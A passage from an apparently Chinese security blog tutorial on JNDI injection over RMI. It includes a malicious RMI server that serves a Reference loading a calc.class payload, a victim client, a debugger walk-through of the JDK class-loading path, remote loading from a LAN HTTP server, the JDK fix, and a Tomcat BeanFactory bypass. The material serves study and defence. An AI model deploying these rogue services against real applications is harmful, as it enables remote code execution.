"rmi://localhost:1099");</code></p><p>这两行代码分别定义了INITIAL_CONTEXT_FACTORY和PROVIDER_URL，即JNDI具体处理的类名称和提供RMI服务端的地址端口。</p><p><code>Context context = new InitialContext(properties);</code>实例化一个context对象</p><p><code>Hello stub = (Hello) context.lookup("rmi://localhost:1099/Hello");</code>的操作就和之前RMI客户端的操作类似了，获取服务端中Hello所绑定的类对象，并且实例化。最后去调用次此对象中的sayHello方法。</p><img src="https://s2.loli.net/2022/04/02/wSmupPAnlGMsrCZ.png" alt="image-20220327202602968" style="zoom:50%;"><h3 id="构建攻击"><a href="#构建攻击" class="headerlink" title="构建攻击"></a>构建攻击</h3><p>jdk版本：1.8.0_73</p><p>看完整个demo的调用流程，我们大概能猜到JNDI的注入利用方式：我们如果控制了context.lookup(“injection”);中的injection，就可以在远程起一个包含恶意方法的RMI服务，将injection指向这个服务，就可以在客户端执行恶意方法。</p><p>首先我们编译一个恶意类（弹个计算器）calc.class，然后编辑RMI恶意服务端代码RMIServer.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> <span class="token string">"calc"</span><span class="token punctuation">,</span> <span class="token string">"file:///C:/Users/86178/IdeaProjects/JNDI/out/production/JNDI/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> wrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span>wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到这个RMIServer.java和我们之前的Server.java有很大不同。在这里我们实例化了一个reference，其中包含了如何去寻找一个factory类的信息。在JNDI与RMI的通信中，RMI接收到JNDI客户端的请求后，实际上是返回了一个reference对象</p><p>Reference的构造：</p><p>Reference(String className, String factory, String factoryLocation)，其中className是加载时所用到的类名，factory是所加载的类中实例化的名称，factoryLocation是提供加载的地址。在上面的代码中，因为恶意类我放在本地，所以这个地址我使用的协议是file，也可以使用http或者ftp加载远程的恶意class。</p><p>JNDI客户端收到reference之后根据reference去加载factory类，也就是这里我们构造的恶意类calc.class。</p><p>接着我们模拟一个被攻击的冤种JNDI客户端YuanZhongClient.java：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">YuanZhongClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:6666/calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功加载恶意类，弹出计算器</p><p><img src="https://s2.loli.net/2022/04/02/Z3yCBlHVYSbu6WG.png" alt="image-20220402223707159"></p><h3 id="攻击过程分析"><a href="#攻击过程分析" class="headerlink" title="攻击过程分析"></a>攻击过程分析</h3><p>我们在<code>new InitialContext().lookup("rmi://localhost:6666/calc");</code>处下断点，进入lookup方法：</p><p><img src="https://s2.loli.net/2022/04/02/PGeNdoQX1UFVOpl.png" alt="image-20220327214942514"></p><p>这里先返回的是<code>return getURLOrDefaultInitCtx(name).lookup(name);</code>，我们继续跟进lookup方法：</p><p><img src="https://s2.loli.net/2022/04/02/WclRnuqLJy6FvY2.png" alt="image-20220327215121008"></p><p>var1是rmi地址和获取的注册名calc，var2获取到根Context，在var3的lookup方法中，从指定的RMI 注册中心获取对象，我们继续跟进</p><p><img src="https://s2.loli.net/2022/04/02/wvT2rqFyXSZNp8Q.png" alt="image-20220327215422164"></p><p>走到其中的decodeObject方法，我们根据这个方法名大致可以推断出，这里对RMI恶意服务端传来的reference进行了decode，并且获取了对象。我们进入其中：</p><p><img src="https://s2.loli.net/2022/04/02/ILm7BSNuM1pDGUg.png" alt="image-20220327215647062"></p><p>走到这里，获取reference的内容就很清晰了，var3的内容就包括恶意RMI服务端传过来的我们精心构造好的reference，我们看到下面还有NamingManager.getObjectInstance方法，进入：</p><p><img src="https://s2.loli.net/2022/04/02/7ufQRn6PbztFwVx.png" alt="image-20220327220355908"></p><p>走到NamingManager.getObjectInstance方法如上图所示的位置，看到这行代码，我们立马就能明白，这里通过<code>getObjectFactoryFromReference(ref, f);</code>获取到了我们需要的工厂类。来都来了，我们继续深入，进去康康：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">static</span> <span class="token class-name">ObjectFactory</span> <span class="token function">getObjectFactoryFromReference</span><span class="token punctuation">(</span>    <span class="token class-name">Reference</span> ref<span class="token punctuation">,</span> <span class="token class-name">String</span> factoryName<span class="token punctuation">)</span>    <span class="token keyword">throws</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span>    <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span>    <span class="token class-name">MalformedURLException</span> <span class="token punctuation">{</span>    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clas <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token comment">// Try to use current class loader</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>         clas <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>factoryName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// ignore and continue</span>        <span class="token comment">// e.printStackTrace();</span>    <span class="token punctuation">}</span>    <span class="token comment">// All other exceptions are passed up.</span>    <span class="token comment">// Not in class path; try to use codebase</span>    <span class="token class-name">String</span> codebase<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>clas <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span>            <span class="token punctuation">(</span>codebase <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getFactoryClassLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            clas <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>factoryName<span class="token punctuation">,</span> codebase<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>clas <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token class-name">ObjectFactory</span><span class="token punctuation">)</span> clas<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>clas是使用类加载器获取的目标类，先是使用<code>helper.loadClass(factoryName);</code>尝试获取到目标类进而加载文件，下面的if语句进行判断上一步是否成功获得，失败的话进入if语句，进入后定义一个codebase，我们能猜到这就是目标代码的位置，结合factoryName和codebase，定位到目标类并且加载文件。最后使用<code>return (clas != null) ? (ObjectFactory) clas.newInstance() : null;</code> 实例化，触发我们恶意类中的恶意方法。</p><p>我在调试的过程中，并没有进入if语句的<code>clas = helper.loadClass(factoryName, codebase);</code>，因为在上面的<code>helper.loadClass(factoryName);</code>后，clas就已经指向我们本地的calc.class了。我回想起来，在上面的恶意服务端RMIServer.java中，我们定义的reference中factoryLocation使用的是file协议，指向本地的恶意类，所以在第一个helper.loadClass就成功获取到了恶意类。我们想要进入if中的<code>clas = helper.loadClass(factoryName, codebase);</code>就需要将恶意class挂在远程。</p><p>我在mac上使用python起一个简易的http.server，将同样的恶意类编译成class文件后放入，</p><ul><li>恶意类所在：<a href="http://192.168.3.79:8000/%EF%BC%88%E6%8C%82%E5%9C%A8%E4%BA%86%E6%88%91%E7%9A%84mac%E4%B8%8A%EF%BC%89">http://192.168.3.79:8000/（挂在了我的mac上）</a></li><li>RMI恶意server&amp;&amp;冤种客户端所在：192.168.3.62（之前所有测试代码都在的win环境）</li></ul><p>将恶意RMI服务端中指定要加载的类（reference的factoryLocation参数）使用http协议指向我们mac上的calc.class，重新运行server和client，成功触发。我们接着调试：</p><p><img src="https://s2.loli.net/2022/04/02/QShC8qtxGOnYFPJ.png" alt="image-20220328150919565"></p><p>这次成功进入了if语句进行判断，codebase指向mac的简易http服务器，使用factoryName和codebase获取到了恶意类。</p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>在JDK 6u132, JDK 7u122, JDK 8u113 中，oracle将系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase默认值改为false，不允许从远程的codebase加载工厂类。</p><h2 id="高版本下RMI的利用方式"><a href="#高版本下RMI的利用方式" class="headerlink" title="高版本下RMI的利用方式"></a>高版本下RMI的利用方式</h2><h3 id="确定思路"><a href="#确定思路" class="headerlink" title="确定思路"></a>确定思路</h3><p>我们看到Oracle官方给出的修复是默认不加载codebase，也就是说默认不能从远程加载class，但是读者们应该还记得，我们使用file协议的时候，并没有进入后面的if，也就是说没用用到codebase进行远程加载。实际上，他的加载机制是先从本地的<code>CLASSPATH</code>寻找是否存在该类，如果不存在，再去使用codebase进行远程加载。在使用file协议测试的时候，file协议指向的是我们本地的恶意class文件路径，这里就算是使用了http协议，指向localhost上部署的恶意class，加载器还是会查找CLASSPATH，加载本地类。有兴趣的读者可以自行验证</p><p>那既然不能加载远程的恶意类，那我们能不能在本地找到可以利用的类方法，其可以满足我们的攻击需求呢？之前我们调试的时候，在NamingManager.java中：</p><p><img src="https://s2.loli.net/2022/04/02/OKoM6ATuXkz8I2R.png" alt="image-20220402180222036"></p><p><code>factory = getObjectFactoryFromReference(ref, f);</code>使用了<code>getObjectFactoryFromReference</code>方法加载一个工厂类，获取到的factory 类在下面一行调用了getObjectInstance方法，且其中的参数是我们伪造reference可控的。所以我们需要找到一个类，满足下列条件：</p><ul><li>实现<code>javax.naming.spi.ObjectFactory</code> 接口，因为在<code>getObjectFactoryFromReference</code>最后返回的实例对象有一个类型转换</li><li>有<code>getObjectInstance</code>方法</li><li>在<code>getObjectInstance</code>方法中存在可构成攻击向量的行为或者可进一步利用的方法</li><li>存在于JDK原生库中或者常见第三方库</li></ul><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>大佬们最终寻找到Tomcat依赖包中的<code>org.apache.naming.factory.BeanFactory</code>。我们来细看<code>getObjectFactoryFromReference</code>方法：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>tomcat<span class="token operator">-</span>catalina<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">8.5</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BeanFactory</span> <span class="token keyword">implements</span> <span class="token class-name">ObjectFactory</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">BeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getObjectInstance</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Name</span> name<span class="token punctuation">,</span> <span class="token class-name">Context</span> nameCtx<span class="token punctuation">,</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">NamingException</span> ne<span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token class-name">Reference</span> ref <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Reference</span><span class="token punctuation">)</span>obj<span class="token punctuation">;</span>                <span class="token class-name">String</span> beanClassName <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> beanClass <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token class-name">ClassLoader</span> tcl <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>tcl <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        beanClass <span class="token operator">=</span> tcl<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>beanClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> var26<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        beanClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>beanClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> var25<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        var25<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>beanClass <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span><span class="token string">"Class not found: "</span> <span class="token operator">+</span> beanClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token class-name">BeanInfo</span> bi <span class="token operator">=</span> <span class="token class-name">Introspector</span><span class="token punctuation">.</span><span class="token function">getBeanInfo</span><span class="token punctuation">(</span>beanClass<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">PropertyDescriptor</span><span class="token punctuation">[</span><span class="token punctuation">]</span> pda <span class="token operator">=</span> bi<span class="token punctuation">.</span><span class="token function">getPropertyDescriptors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">Object</span> bean <span class="token operator">=</span> beanClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">RefAddr</span> ra <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Method</span><span class="token punctuation">&gt;</span></span> forced <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">String</span> value<span class="token punctuation">;</span>                    <span class="token class-name">String</span> propName<span class="token punctuation">;</span>                    <span class="token keyword">int</span> i<span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>ra <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>ra<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">;</span>                        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr$ <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        i <span class="token operator">=</span> arr$<span class="token punctuation">.</span>length<span class="token punctuation">;</span>                        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i$ <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i$ <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> <span class="token operator">++</span>i$<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token class-name">String</span> param <span class="token operator">=</span> arr$<span class="token punctuation">[</span>i$<span class="token punctuation">]</span><span class="token punctuation">;</span>                            param <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">int</span> index <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                propName <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                param <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                propName <span class="token operator">=</span> <span class="token string">"set"</span> <span class="token operator">+</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token class-name">Locale</span><span class="token punctuation">.</span>ENGLISH<span class="token punctuation">)</span> <span class="token operator">+</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">try</span> <span class="token punctuation">{</span>                                forced<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> beanClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>propName<span class="token punctuation">,</span> paramTypes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> <span class="token operator">|</span> <span class="token class-name">NoSuchMethodException</span> var24<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span><span class="token string">"Forced String setter "</span> <span class="token operator">+</span> propName <span class="token operator">+</span> <span class="token string">" not found for property "</span> <span class="token operator">+</span> param<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token class-name">Enumeration</span> e <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">do</span> <span class="token punctuation">{</span>                                <span class="token keyword">do</span> <span class="token punctuation">{</span>                                    <span class="token keyword">do</span> <span class="token punctuation">{</span>                                        <span class="token keyword">do</span> <span class="token punctuation">{</span>                                            <span class="token keyword">do</span> <span class="token punctuation">{</span>                                                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>e<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                    <span class="token keyword">return</span> bean<span class="token punctuation">;</span>                                                <span class="token punctuation">}</span>                                                ra <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RefAddr</span><span class="token punctuation">)</span>e<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                propName <span class="token operator">=</span> ra<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                            <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span>propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span>propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"scope"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span>propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"auth"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span>propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span>propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"singleton"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>ra<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> valueArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                            <span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Method</span><span class="token punctuation">)</span>forced<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>propName<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>method <span class="token operator">!=</span> <span class="token 